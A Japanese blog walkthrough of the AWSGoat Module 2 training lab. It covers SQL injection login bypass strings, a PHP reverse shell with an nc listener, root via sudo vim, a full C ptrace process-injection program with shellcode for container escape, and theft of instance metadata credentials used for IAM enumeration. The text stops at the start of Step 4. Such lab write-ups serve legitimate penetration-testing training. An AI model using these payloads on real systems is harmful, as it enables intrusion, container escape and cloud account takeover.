<span style="color: #ff0000"> **⚠️ AWSGoat Module-2 のネタバレあり** </span>

<div style="text-align:center;">
[f:id:motikan2010:20230531111418p:plain:w600]
</div>

<div class="contents-box"><p>[:contents]</p></div>

## はじめに

<span style="color: #ff0000"> **⚠️ AWSGoat Module-2 のネタバレあり** </span>

　本記事では、AWS環境のやられアプリである「**AWSGoat**」を使って、AWS環境下でのペネトレーションテスト（ペンテスト）の学習してみたのでその紹介です。

　AWSGost は教育コンテンツで有名な「**INE**」が提供しており、アプリケーションやインフラのコードは以下のリポジトリで公開されています。  

[https://github.com/ine-labs/AWSGoat:embed:cite]

　AWSGost は２つのラボが用意されており、「Module 1」と「Module 2」があります。  

　**本記事は「Module 2」を紹介していきます。**  

<figure class="figure-image figure-image-fotolife" title="Module 2 のインフラ構成（引用：ine-labs/AWSGoat）">[f:id:motikan2010:20230531104745p:plain:w700]<figcaption>Module 2 のインフラ構成（引用：ine-labs/AWSGoat）</figcaption></figure>

### 攻撃方法の分類

　AWSGoat の Module 2 には主に以下の３つの分類に対しての攻撃方法を学ぶことができます。  

- Webアプリケーション
- コンテナの設定
- AWS IAM の権限

　本記事では、インフラに重点を置かれている「コンテナの設定」「AWS IAMの権限」箇所を大々的に説明してきます。  

　そのため「Webアプリケーション」に関しての説明は少なめになっています。  

　また、公式の攻略手順も公開されているため、これを参考にするのも良いかと思います。  
https://github.com/ine-labs/AWSGoat/tree/master/attack-manuals/module-2

### インフラの料金

　AWSGoat はAWS上で動作するため、料金が掛かります。  

　以下の料金の記載がありました。  

- Module 1: $0.0125/hour  (1.75円 / 時)
- Module 2: $0.0505/hour (7.07円 / 時)

## ラボ環境の構築

AWSGost の環境構築は簡単です。  

各インフラは Terraform で記述されており、GitHub Actions からデプロイできるようになっています。  

公式の手順：
[https://github.com/ine-labs/AWSGoat#installation]

<span style="color: #ff0000">脆弱なアプリケーションや脆弱なサービスの設定がデプロイされます。  </span>

<span style="color: #ff0000">**検証環境のような最悪侵入されても問題ないAWSアカウントに構築してください。**</span>

#### AWSGost リポジトリをフォーク 

リポジトリ「ine-labs/AWSGoat」をフォークします。  

<span><a href="https://github.com/ine-labs/AWSGoat" target="_blank">ine-labs/AWSGoat: AWSGoat : A Damn Vulnerable AWS Infrastructure</a></span>

#### Actions secrets でクレデンシャルを設定

　ポリシー「AdministratorAccess」が付与されているAWSユーザのクレデンシャルを指定します。  

[f:id:motikan2010:20230531011732p:plain:w600]

#### GitHub Actions でデプロイ

　GitHub Actions にある「Terraform Apply」の「module-2」を選択して、「Run workflow」を押下します。  

　AWS上にやられ環境が構築されます。  

　環境を削除するには「Terraform Destroy」から削除できるようになっています。  

[f:id:motikan2010:20230531013814p:plain:w600]

　出力結果にある「Application URL」がこのラボのスタート地点となるWebアプリケーションです。  

[f:id:motikan2010:20230531004100p:plain:w600]

## Module-2の大体の流れ

　Module-2 は大きく分けて４つのStepが存在しています。  

<span style="color: #ff0000">本記事では「Step 3」と「Step 4」に重点を置いて説明をしていきます。</span>

**Step 1. SQL Injection**

1. ログイン画面に**SQLi**の脆弱性があり、それを利用してダッシュボードにログイン

**Step 2. File Upload and Task Metadate**

1. アプリケーションにPHPファイルをアップロードできる脆弱性があるので**リバースシェルを配置**してシェルを取得  
（ここで取得できるシェルはコンテナ内かつroot権限でもない）

**Step 3. ECS Breakout and Instance Metadata**

1. vimを活用した権限昇格（コンテナ内でroot権限を取得）
1. ホスト上にあるプロセスに対してのプロセスインジェクションを実施して**コンテナからの脱獄**  
（ホストマシンのroot権限を取得）
1. ホストマシンの一時クレデンシャルを取得

**Step 4. IAM Privilege Escalation**

1. 強い権限のポリシー・ロールを探索
1. 強い権限をもったEC2インスタンスを作成 & インスタンスから一時クレデンシャルを取得
1. 管理者権限（AdministratorAccess）を持った「バックドアAWSユーザ」を追加（<span style="color: #ff0000">最終目標</span>）

## Step 1. SQL Injection

　環境構築時に出力されるURLにアクセスすると下画像のようなログイン画面が表示されます。  

　このパートではログインを成功させることが目的となっています。  

[f:id:motikan2010:20230531004114p:plain:w600]

#### 解法

- Webアプリケーションのログインページに移動します。
- ここで、SQLiを実行するためのインジェクション対象として Email を見つけることができます。
- 以下の値をログインIDに指定することで一般アカウントでログインすることが可能です。  
「`' or '1'='1'#`」
- 以下の値をログインIDに指定することで**管理者**アカウントでログインすることが可能です。  
「`' or '1'='1' limit 3#`」

　<span style="color: #ff0000">「LIMIT 句」の有無によってログインされるアカウントが異なる点は学習ポイント</span>

#### 脆弱性があるコード

　ちなみにログイン箇所のソースコードは以下ようになっており、SQLインジェクションの脆弱性があることが分かります。  

[f:id:motikan2010:20230531004137p:plain:w600]

<span><a href="https://github.com/ine-labs/AWSGoat/blob/master/modules/module-2/src/src/login.php#L21" target="_blank">https://github.com/ine-labs/AWSGoat/blob/master/modules/module-2/src/src/login.php#L21</a></span>

## Step 2. File Upload and Task Metadate

　ダッシュボードでは管理者アカウントでログインすることでファイルのアップロードが可能になります。  

　アップロードされるファイルの検証行われておらず、PHPファイルのアップロードできるという脆弱性が存在しています。

　そこにPHPで記述されたリバースシェルを配置し、それにアクセスすることでシェルの取得ができます。  

　具体的な攻略内容は公式を確認！  

[https://github.com/ine-labs/AWSGoat/blob/master/attack-manuals/module-2/02-File%20Upload%20and%20Task%20Metadata.md#uploading-reverse-shell:title]

#### リバースシェルの用意

リバースシェルは以下のコードを利用します。  

[https://github.com/pentestmonkey/php-reverse-shell:title]


　50行目付近に接続を待ち受けるマシンのIPアドレスとポート番号を設定する箇所がありますので、そこにAWS環境からアクセスできるマシンの情報を記述します。  

<div class="md-code" style="width:100%">

```php
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

</div>

#### 待ち受け側

　接続を待ち受けるマシン上で「nc -nlvp 4443」コマンドを実行します。  

<div class="md-code" style="width:100%">

```
[root@i-14100000180835 ~]# nc -nlvp 4443
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::4443
Ncat: Listening on 0.0.0.0:4443
Ncat: Connection from 52.87.yyy.zzz.
Ncat: Connection from 52.87.yyy.zzz:53874.
Linux 533e4e3fac01 4.14.313-235.533.amzn2.x86_64 #1 SMP Tue Apr 25 15:24:19 UTC 2023 x86_64 GNU/Linux
 12:35:58 up 20 min,  0 users,  load average: 0.00, 0.01, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

</div>


## Step 3. ECS Breakout and Instance Metadata

　「Step 3」では、「Step 2」で取得したシェルを使って主に以下の２つのことを実施します。  

- コンテナからの脱獄
- メタデータサービス（IMDS：Instance Metadata Service）へのアクセス

### 現ユーザの権限を確認

　シェルを取得することができたので、アクセス可能なリソースを簡単に確認します。  

#### リソースへのアクセスを試行

　「`/root`ディレクトリ」と「`/etc/shadow`ファイル」にアクセスできるか確認します。

<div class="md-code" style="width:100%">

```
$ cd /root
/bin/sh: 4: cd: can't cd to /root

$ cat /etc/shadow
cat: /etc/shadow: Permission denied
```

</div>

　権限がなくアクセスできませんでした。

　次は、メタデータサービス（`http://169.254.169.254/latest/meta-data/`）にアクセスしてみて、クレデンシャルを取得できるかを試してみます。  

<div class="md-code" style="width:100%">

```
$ curl -m 5 http://169.254.169.254/latest/meta-data/
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:--  0:00:05 --:--:--     0
curl: (28) Connection timed out after 5000 milliseconds
```

</div>

　メタデータサービスにもアクセスができませんでした。  

#### ケイパビリティを確認 (www-data ユーザ)

　「`capsh`」コマンドで有効になっているケイパビリティ(capability)の設定を確認します。

　「`Current:=`」フィールドが空となっているため、十分な権限がないことが確認できます。  

<div class="md-code" style="width:100%">

```
$ capsh --print
Current: =
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Ambient set =
Current IAB: !cap_dac_read_search,!cap_linux_immutable,!cap_net_broadcast,!cap_net_admin,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_module,!cap_sys_rawio,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_lease,!cap_audit_control,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=33(www-data) euid=33(www-data)
gid=33(www-data)
groups=33(www-data)
Guessed mode: UNCERTAIN (0)
```

</div>

### コンテナ内でroot権限を取得

　コンテナ内でroot権限のシェルを取得していきます。

　手始めに「`sudo su`」コマンドでrootになれないかを試してみましたができないようでした。  

<div class="md-code" style="width:100%">

```
$ sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
```

</div>

#### sudo可能なコマンドを確認

　現在のユーザでsudo可能なコマンド一覧を確認するために「`sudo -l`」コマンドを実行します。  

<div class="md-code" style="width:100%">

```
$ sudo -l
Matching Defaults entries for www-data on 533e4e3fac01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 533e4e3fac01:
    (root) NOPASSWD: /usr/bin/vim /var/www/html/documents
```

</div>

　「`/usr/bin/vim /var/www/html/documents`」コマンドが `sudo` で実行することが可能であることが分かりました。

　vim をsudoで動作させることでroot権限のシェルを取得する方法があるのでこの方法を活用することにします。

[https://web-wilke.de/use-vi-vim-for-privilege-escalation/:title]

#### Vim経由でroot権限のシェルを取得

　Vimが起動したら「`:! /bin/sh`」と入力し、[Enter]します。

<div class="md-code" style="width:100%">

```
$ sudo /usr/bin/vim /var/www/html/documents
Vim: Warning: Output is not to a terminal
Vim: Warning: Input is not from a terminal

E558: Terminal entry not found in terminfo
'unknown' not known. Available builtin terminals are:
    builtin_amiga
    builtin_ansi
    builtin_pcansi
    builtin_win32
    builtin_vt320
    builtin_vt52
    builtin_xterm
    builtin_iris-ansi
    builtin_debug
    builtin_dumb
defaulting to 'ansi'
```

</div>


<div class="md-code" style="width:100%">

```
" ============================================================================
" Netrw Directory Listing                                        (netrw v170)
"   /var/www/html/documents
"   Sorted by      name
"   Sort sequence: [\/]$,\<core\%(\.\d\+\)\=\>,\.h$,\.c$,\.cpp$,\~\=\*$,*,\.o$,\
"   Quick Help: <F1>:help  -:go up dir  D:delete  R:rename  s:sort-by  x:special
" ==============================================================================
:! /bin/sh
./
payslips/
reimbursments/
~
~
~
~
~
~
~
~
~
~
~
~
:! /bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
```

</div>

　末尾の「`id`」コマンドを実行しており、出力が「`uid=0(root) gid=0(root) groups=0(root)`」となっていることから、root権限が取得できていることが確認できます。

#### ケイパビリティを確認 (root ユーザ)

　再度「`capsh`」コマンドでケイパビリティを確認し、root権限になっているかを確認します。  

<div class="md-code" style="width:100%">

```
capsh --print
Current: cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap=ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Ambient set =
Current IAB: !cap_dac_read_search,!cap_linux_immutable,!cap_net_broadcast,!cap_net_admin,!cap_ipc_lock,!cap_ipc_owner,!cap_sys_module,!cap_sys_rawio,!cap_sys_pacct,!cap_sys_admin,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,!cap_lease,!cap_audit_control,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root) euid=0(root)
gid=0(root)
groups=0(root)
Guessed mode: UNCERTAIN (0)
```

</div>

　ここで重要なのは**コンテナ内でのみroot権限を取得した**ということです。

　まだメタデータサービスにアクセスできない等、制限は設けられています。

### コンテナから脱獄（Jailbreak）

　コンテナから脱獄してホストマシン上でroot権限のシェルを取得していきます。

#### プロセスの一覧を表示 （プロセスインジェクションの準備）

　コンテナ内でroot権限を取得することができたので、一旦このコンテナの起動オプションを確認し、脱獄に利用できるオプションはないかを探してみます。  

　このコンテナ環境はECS タスク定義で`pidMode`パラメータに「`host`」と設定されており、<span style="color: #ff0000">**ホストマシンのPID名前空間がコンテナ環境にマッピングされている状態**</span>のようです。    

　このためホスト環境の「プロセス列挙」や「プロセスへのアクセス」ができます。  

[f:id:motikan2010:20230531152707p:plain:w500]

　ちなみにこの設定はAWS Coinfig で警告される非推奨な設定です。  
<span><a href="https://docs.aws.amazon.com/ja_jp/config/latest/developerguide/ecs-task-definition-pid-mode-check.html" target="_blank">ecs-task-definition-pid-mode-check - AWS Config</a></span>

　また、コンテナ環境の<span style="color: #ff0000">**ケイパビリティに「SYS_PTRACE」が追加されてる**</span>ため任意のプロセスを操作することできます。  
下画像はECS タスク定義のケイパビリティの設定部分です。  「`SYS_PTRACE`」が追加されています。
[f:id:motikan2010:20230531114421p:plain:w600]  
<span><a href="https://github.com/ine-labs/AWSGoat/blob/ac00c7ac66745caca918058abd06593b2b41dc87/modules/module-2/resources/ecs/task_definition.json#L16-L20" target="_blank">/modules/module-2/resources/ecs/task_definition.json</a></span>

　<span style="color: #ff0000">このことからコンテナ環境からプロセスインジェクションで脱獄することができます。</span>  

　プロセスインジェクションで脱獄するために利用できるプロセスを探すため、プロセス一覧を表示します。  

　root権限で動作している「`python3 -m http.server 31452`」のプロセスをシェルコードのインジェクション対象にします。  

<div class="md-code" style="width:100%">

```
ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
（省略）
root      4448  4098  0 12:15 ?        00:00:03 /usr/bin/ssm-agent-worker
root     19477     1  0 12:16 ?        00:00:00 python3 -m http.server 31452
root     19550     1  0 12:16 ?        00:00:00 /usr/libexec/amazon-ecs-init start
（省略）
```

</div>

　コンテナから脱獄するためのプロセスインジェクションについては以下の記事が分かりやすいです。  
なぜ Python のプロセスをインジェクション対象に選んだのかなど、詳しく説明されています。    

[https://tbhaxor.com/container-breakout-part-1/#lab-process-injection:embed:cite]

#### シェルを Full TTY にアップグレード

　プロセスインジェクションを実施する前に、シェルを使いやすくするため「**Full TTY**」シェルにアップグレードします。  

　Pythonが導入されているので、Pythonを活用した方法で実施しています。  

<div class="md-code" style="width:100%">

```
python3 -V
Python 3.9.2

python3 -c "import pty;pty.spawn('/bin/bash')"
root@533e4e3fac01:/#

root@533e4e3fac01:/# uname -a
Linux 533e4e3fac01 4.14.313-235.533.amzn2.x86_64 #1 SMP Tue Apr 25 15:24:19 UTC 2023 x86_64 GNU/Linux
```

</div>

#### プロセスインジェクションの実行

　実行中のプロセスにシェルコードをインジェクションするために、以下のC言語プログラムを利用します。  

[https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c:embed:cite]

このC言語プログラムの説明はこの記事が参考になります。  

[https://0x00sec.org/t/linux-infecting-running-processes/1097:title]


　インジェクションするシェルコードは以下のコード参考にします。  

[https://www.exploit-db.com/exploits/41128:embed:cite]

<div class="md-code" style="width:100%">

```
\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05
```

</div>

　インジェクションするシェルコードを反映したC言語プログラムは以下のようになります。  

　これを「`inject.c`」というファイル名で保存します。

<div class="md-code" style="width:100%">

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>
#include <sys/reg.h>

#define SHELLCODE_SIZE 87

unsigned char *shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05";

int inject_data(pid_t pid, unsigned char *src, void *dst, int len)
{
    int i;
    uint32_t *s = (uint32_t *)src;
    uint32_t *d = (uint32_t *)dst;

    for (i = 0; i < len; i += 4, s++, d++)
    {
        if ((ptrace(PTRACE_POKETEXT, pid, d, *s)) < 0)
        {
            perror("ptrace(POKETEXT):");
            return -1;
        }
    }
    return 0;
}

int main(int argc, char *argv[])
{
    pid_t target;
    struct user_regs_struct regs;
    int syscall;
    long dst;
    if (argc != 2)
    {
        fprintf(stderr, "Usage:\n\t%s pid\n", argv[0]);
        exit(1);
    }

    target = atoi(argv[1]);
    printf("+ Tracing process %d\n", target);

    if ((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
        perror("ptrace(ATTACH):");
        exit(1);
    }
    printf("+ Waiting for process...\n");
    wait(NULL);
    printf("+ Getting Registers\n");

    if ((ptrace(PTRACE_GETREGS, target, NULL, &regs)) < 0)
    {
        perror("ptrace(GETREGS):");
        exit(1);
    }

    /* Inject code into current RPI position */

    printf("+ Injecting shell code at %p\n", (void *)regs.rip);
    inject_data(target, shellcode, (void *)regs.rip, SHELLCODE_SIZE);
    regs.rip += 2;
    printf("+ Setting instruction pointer to %p\n", (void *)regs.rip);

    if ((ptrace(PTRACE_SETREGS, target, NULL, &regs)) < 0)
    {
        perror("ptrace(GETREGS):");
        exit(1);
    }
    printf("+ Run it!\n");

    if ((ptrace(PTRACE_DETACH, target, NULL, NULL)) < 0)
    {
        perror("ptrace(DETACH):");
        exit(1);
    }
    return 0;
}
```

</div>

<br>
　標的マシン上で上記C言語プログラムを記述してもよいのですが、私は外部マシン上でC言語プログラムを記述しそれを標的マシン上でダウンロードしました。  

<div class="md-code" style="width:100%">


```
root@533e4e3fac01:/# curl http://164.xxx.yyy.xxx/inject.c -o inject.c
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2185  100  2185    0     0   6207      0 --:--:-- --:--:-- --:--:--  6189
```

</div>

<br>
　プログラムを標的マシン上に配置できたらコンパイルを実施します。  

<div class="md-code" style="width:100%">

```
root@533e4e3fac01:/# gcc inject.c -o inject
```

</div>

<br>
　シェルコードのインジェクション対象とするプロセスのPID（`19477`）を取得します。  

<div class="md-code" style="width:100%">

```
root@533e4e3fac01:/# ps -ef | grep "python"
ps -ef | grep "python"
root       650 32420  0 13:51 pts/0    00:00:00 grep python
root     19477     1  0 12:16 ?        00:00:00 python3 -m http.server 31452
root     32419 21500  0 13:34 ?        00:00:00 python3 -c import pty;pty.spawn('/bin/bash')
```

</div>

<br>
　取得したPIDを指定してプログラムを実行します。

<div class="md-code" style="width:100%">

```
root@533e4e3fac01:/# ./inject 19477
./inject 19477
+ Tracing process 19477
+ Waiting for process...
+ Getting Registers
+ Injecting shell code at 0x7f418d201604
+ Setting instruction pointer to 0x7f418d201606
+ Run it!
```

</div>

<br>
　コンテナ内でネットワーク情報の取得し、ホストマシンのIPアドレスを推測します。  

<div class="md-code" style="width:100%">

```
root@533e4e3fac01:/# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
        RX packets 3659  bytes 400605 (391.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3312  bytes 3683641 (3.5 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

</div>

<br>
　ホストマシン上でroot権限で動作しているプロセスに「`nc`」コマンドで接続します。

<div class="md-code" style="width:100%">

```
root@533e4e3fac01:/# nc 172.17.0.1 5600
```

</div>

<br>
　ルートディレクトリを確認してみると、コンテナ環境からホストマシンへ移動（脱獄）できていることが確認できました。  

<div class="md-code" style="width:100%">

```
ls -la /
total 12
dr-xr-xr-x  18 root root  257 May 12 19:48 .
dr-xr-xr-x  18 root root  257 May 12 19:48 ..
-rw-r--r--   1 root root    0 May 12 19:48 .autorelabel
lrwxrwxrwx   1 root root    7 May  5 18:07 bin -> usr/bin
dr-xr-xr-x   4 root root  317 May  5 18:08 boot
drwxr-xr-x  15 root root 2800 May 29 12:15 dev
drwxr-xr-x  80 root root 8192 May 29 12:15 etc
drwxr-xr-x   3 root root   22 May 12 19:48 home
lrwxrwxrwx   1 root root    7 May  5 18:07 lib -> usr/lib
lrwxrwxrwx   1 root root    9 May  5 18:07 lib64 -> usr/lib64
drwxr-xr-x   2 root root    6 May  5 18:07 local
drwxr-xr-x   2 root root    6 Apr  9  2019 media
drwxr-xr-x   2 root root    6 Apr  9  2019 mnt
drwxr-xr-x   4 root root   35 May 29 12:15 opt
dr-xr-xr-x 124 root root    0 May 29 12:15 proc
dr-xr-x---   3 root root  103 May 12 19:48 root
drwxr-xr-x  25 root root  900 May 29 12:16 run
lrwxrwxrwx   1 root root    8 May  5 18:07 sbin -> usr/sbin
drwxr-xr-x   2 root root    6 Apr  9  2019 srv
dr-xr-xr-x  13 root root    0 May 29 13:43 sys
drwxrwxrwt   8 root root  212 May 29 13:53 tmp
drwxr-xr-x  13 root root  155 May  5 18:07 usr
drwxr-xr-x  18 root root  254 May 29 12:15 var
```

</div>

#### クレデンシャルの取得

　メタデータサービス（`http://169.254.169.254/latest/meta-data/`）にアクセスしてクレデンシャルを取得します。

<div class="md-code" style="width:100%">

```
curl -m 5 http://169.254.169.254/latest/meta-data/

ami-id
ami-launch-index
ami-manifest-path
autoscaling/
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
reservation-id
security-groups
services/
system
```

</div>

　ロール一覧を取得します。

<div class="md-code" style="width:100%">

```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials

ecs-instance-role
```

</div>

　ロール名を指定してからクレデンシャルを取得します。

<div class="md-code" style="width:100%">

```
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ecs-instance-role

{
  "Code" : "Success",
  "LastUpdated" : "2023-05-29T12:53:38Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAVJX7XXXXXXXXXXXX",
  "SecretAccessKey" : "2vPPTE1Gmg1NLUhDxxxxxxxxxxxxxxxxxxxxxxxx",
  "Token" : "IQoJb3JpZ2luX2VjED0aCXVzLWVhc3QtMSJIMEYCIQDXG29pO3wKPpUVH6W30DJAQIhuKsV3WPs9xxxxxxxxxxxx",
  "Expiration" : "2023-05-29T19:11:59Z"
}
```

</div>

#### クレデンシャルの設定


　AWS CLI が利用できるマシン（ローカルPC など）に以下の環境変数を設定します。

- AWS_ACCESS_KEY_ID
- AWS_SECRET_ACCESS_KEY
- AWS_SESSION_TOKEN

　私の環境ではデフォルトのリージョンが「`ap-northeast-1`」になっていたのでクレデンシャルの設定以外に「`export AWS_DEFAULT_REGION=us-east-1`」の設定も実施しました。

<div class="md-code" style="width:100%">

```
export AWS_ACCESS_KEY_ID=ASIAVJX7XXXXXXXXXXXX
export AWS_SECRET_ACCESS_KEY=2vPPTE1Gmg1NLUhDxxxxxxxxxxxxxxxxxxxxxxxx
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjED0aCXVzLWVhc3QtMSJIMEYCIQDXG29pO3wKPpUVH6W30DJAQIhuKsV3WPs9xxxxxxxxxxxx

export AWS_DEFAULT_REGION=us-east-1
```

</div>

　設定したクレデンシャルが有効であるかを確認します。

<div class="md-code" style="width:100%">

```
$ aws sts get-caller-identity
{
    "UserId": "AROAVJV7MGT3ZFHMKJXHB:i-00b41f7908dc8d792",
    "Account": "364300000000",
    "Arn": "arn:aws:sts::364300000000:assumed-role/ecs-instance-role/i-00b41f7908dc8d792"
}
```

</div>

## Step 4. IAM Privilege Escalation

　「Step 4」では「Step 3」で取得したクレデンシャルを活用して、主に以下の３つを実施していきます。

- 強い権限を持ったIAMロールの探索
- そのIAMロールをアタッチしたEC2の起動
- AdministratorAccess ポリシーを持ったバックドアAWSユーザの追加

### 現在のロールの確認

　侵入したECSのインスタンスにアタッチされているロールを確認します。

　そしてロールにアタッチされているポリシーのポリシードキュメント（アクセス許可と拒否の条件がJSON形式で記述されたもの）を取得し、具体的なアクセス権限を確認します。


#### ロールのポリシー一覧を取得する (aws iam list-attached-role-policies)

> コマンド説明：aws iam list-attached-role-policies  
指定されたIAMロールにアタッチされているすべてのマネージドポリシーをリストアップします。  

　ロール名「`ecs-instance-role`」にアタッチされているポリシー一覧を取得します。

<div class="md-code" style="width:100%">

```
$ aws iam list-attached-role-policies --role-name ecs-instance-role
```

</div>

　このロールには「**IAMFullAccess**」ポリシーがアタッチされています。  

　そのため、ユーザを作成して管理者権限を付与することができるはずです。（※願望）

<div class="md-code" style="width:100%">

```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "AmazonSSMManagedInstanceCore",
            "PolicyArn": "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"
        },
        {
            "PolicyName": "IAMFullAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/IAMFullAccess"
        },
        {
            "PolicyName": "AmazonEC2ContainerServiceforEC2Role",
            "PolicyArn": "arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role"
        },
        {
            "PolicyName": "aws-goat-instance-policy",
            "PolicyArn": "arn:aws:iam::364300000000:policy/aws-goat-instance-policy"
        }
    ]
}
```

</div>

#### AWS ユーザの追加を試行 (aws iam create-user)

　「`hacker`」という名前のユーザを作成してみます。


<div class="md-code" style="width:100%">

```
$ aws iam create-user --user-name hacker
```

</div>

　「**IAMFullAccess**」のポリシーを持っているにもかかわらず、パーミッションが拒否されました。

<div class="md-code" style="width:100%">

```
An error occurred (AccessDenied) when calling the CreateUser operation: User: arn:aws:sts::364300000000:assumed-role/ecs-instance-role/i-00b41f7908dc8d792 is not authorized to perform: iam:CreateUser on resource: arn:aws:iam::364300000000:user/hacker because no permissions boundary allows the iam:CreateUser action
```

</div>

　原因を調べるために、ロールの詳細を確認してみます。

#### ecs-instance-role ロールの詳細を確認 (aws iam get-role)

　ロール「`ecs-instance-role`」の詳細を確認してみます。

<div class="md-code" style="width:100%">

```
$ aws iam get-role --role-name ecs-instance-role
```

</div>

　ロールに「**アクセス許可境界（Permissions Boundary）**」が設定されていたため、AWSユーザの作成が失敗していました。

<div class="md-code" style="width:100%">

```json
{
    "Role": {
        "Path": "/",
        "RoleName": "ecs-instance-role",
        "RoleId": "AROAVJV7MGT3ZFHMKJXHB",
        "Arn": "arn:aws:iam::364300000000:role/ecs-instance-role",
        "CreateDate": "2023-05-29T12:14:16+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2008-10-17",
            "Statement": [
                {
                    "Sid": "",
                    "Effect": "Allow",
                    "Principal": {
                        "Service": "ec2.amazonaws.com"
                    },
                    "Action": "sts:AssumeRole"
                }
            ]
        },
        "MaxSessionDuration": 3600,
        "PermissionsBoundary": {
            "PermissionsBoundaryType": "Policy",
            "PermissionsBoundaryArn": "arn:aws:iam::364300000000:policy/aws-goat-instance-boundary-policy"
        },
        "RoleLastUsed": {
            "LastUsedDate": "2023-05-29T13:40:18+00:00",
            "Region": "us-east-1"
        }
    }
}
```

</div>

　ポリシー「`aws-goat-instance-boundary-policy`」の詳細を調べていきます。

#### ポリシーのバージョンIDを取得する (aws iam get-policy)

> コマンド説明： aws iam get-policy  
指定された管理対象ポリシーに関する情報を取得します。

